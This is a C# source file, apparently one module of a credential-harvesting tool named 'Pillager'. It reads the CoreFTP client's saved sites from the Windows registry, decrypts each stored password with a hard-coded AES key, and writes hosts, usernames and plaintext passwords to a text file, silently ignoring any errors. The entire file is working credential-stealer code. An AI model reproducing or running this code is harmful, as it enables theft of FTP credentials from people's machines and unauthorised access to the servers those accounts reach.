using Microsoft.Win32;
using Pillager.Helper;
using System;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Pillager.FTPs
{
    internal class CoreFTP : ICommand
    {
        public string GetInfo()
        {
            StringBuilder sb = new StringBuilder();
            string rkPath = "Software\\FTPWare\\CoreFTP\\Sites";
            using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(rkPath, false))
            {
                if (rk != null)
                {
                    foreach (string text in rk.GetSubKeyNames())
                    {
                        using (RegistryKey rkSession = Registry.CurrentUser.OpenSubKey(Path.Combine(rkPath, text), false))
                        {
                            object value = rkSession.GetValue("Host");
                            object value2 = rkSession.GetValue("Port");
                            object value3 = rkSession.GetValue("User");
                            object value4 = rkSession.GetValue("PW");
                            if (value != null && value3 != null && value4 != null)
                            {
                                sb.AppendLine("Server:"+ string.Format("{0}:{1}", value.ToString(), value2.ToString()));
                                sb.AppendLine(value3.ToString());
                                sb.AppendLine(Decrypt(value4.ToString(), "hdfzpysvpzimorhk"));
                                sb.AppendLine();
                            }
                        }
                    }
                }
            }
            return sb.ToString();
        }

        private string Decrypt(string encryptedData, string key)
        {
            byte[] array = Encoding.UTF8.GetBytes(key);
            PadToMultipleOf(ref array, 8);
            byte[] array2 = ConvertHexStringToByteArray(encryptedData);
            string text;
            using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
            {
                rijndaelManaged.KeySize = array.Length * 8;
                rijndaelManaged.Key = array;
                rijndaelManaged.Mode = CipherMode.ECB;
                rijndaelManaged.Padding = PaddingMode.None;
                using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor())
                {
                    byte[] array3 = cryptoTransform.TransformFinalBlock(array2, 0, array2.Length);
                    text = Encoding.UTF8.GetString(array3);
                }
            }
            return text;
        }

        private void PadToMultipleOf(ref byte[] src, int pad)
        {
            int num = (src.Length + pad - 1) / pad * pad;
            Array.Resize(ref src, num);
        }

        private byte[] ConvertHexStringToByteArray(string hexString)
        {
            if (hexString.Length % 2 != 0)
            {
                throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", hexString));
            }
            byte[] array = new byte[hexString.Length / 2];
            for (int i = 0; i < array.Length; i++)
            {
                string text = hexString.Substring(i * 2, 2);
                array[i] = byte.Parse(text, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
            }
            return array;
        }

        public override void Save(string path)
        {
            try
            {
                string output = GetInfo();
                if (!string.IsNullOrEmpty(output))
                {
                    string savepath = Path.Combine(path, "CoreFTP");
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, "CoreFTP.txt"), output, Encoding.UTF8);
                }
            }
            catch { }
        }
    }
}
